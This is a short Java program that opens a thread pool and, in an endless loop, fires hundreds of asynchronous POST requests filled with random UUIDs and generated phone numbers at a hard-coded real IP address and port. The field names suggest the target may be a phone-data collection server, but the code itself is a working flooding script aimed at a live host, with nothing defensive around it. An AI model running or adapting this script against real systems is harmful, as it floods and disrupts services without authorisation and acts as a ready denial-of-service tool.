package com.sobev.forestapi.requests;

import okhttp3.*;

import java.io.IOException;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class FloodFakeData implements Runnable {

    public static void main(String[] args) {
        ExecutorService fixedThreadPool = Executors.newFixedThreadPool(7);
        FloodFakeData floodFakeData1 = new FloodFakeData();
        FloodFakeData floodFakeData2 = new FloodFakeData();
        fixedThreadPool.execute(floodFakeData1);
        fixedThreadPool.execute(floodFakeData2);
    }

    @Override
    public void run() {
        try {
            sendReq();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    private void sendReq() throws InterruptedException {
        OkHttpClient client = new OkHttpClient();
        while (true) {
            Thread.sleep(1);
            for (int i = 0; i < 100; i++) {
                FormBody form = new FormBody.Builder()
                        .add("myInfo", "[{\"name\":\"0xFF\",\"phone\":\"11011011011\"}, {\"name\":\"103.100.62.52:90\",\"phone\":\"2\"}]")
                        .add("myWhere", UUID.randomUUID().toString())
                        .add("myMsgs", "[" + UUID.randomUUID() + "]")
                        .add("myWho", PhoneGenerator.getTel())
                        .add("myTel", PhoneGenerator.getTel())
                        .add("myRoom", UUID.randomUUID().toString())
                        .add("tel", PhoneGenerator.getTel())
                        .add("deviceID", UUID.randomUUID().toString())
                        .add("myModel", PhoneGenerator.getTel())
                        .build();

                Request request = new Request.Builder()
                        .url("http://103.100.62.52:90/api/6014C57404A138AF2DD3B680FCAA0DA9" + i)
                        .post(form)
                        .build();

                Call call = client.newCall(request);

                call.enqueue(new Callback() {
                    @Override
                    public void onFailure(Call call, IOException e) {
                        System.out.println("请求失败");
                    }

                    @Override
                    public void onResponse(Call call, Response response) throws IOException {
                        System.out.println("response内容: " + response.body().string());
                    }
                });
            }
        }
    }
}
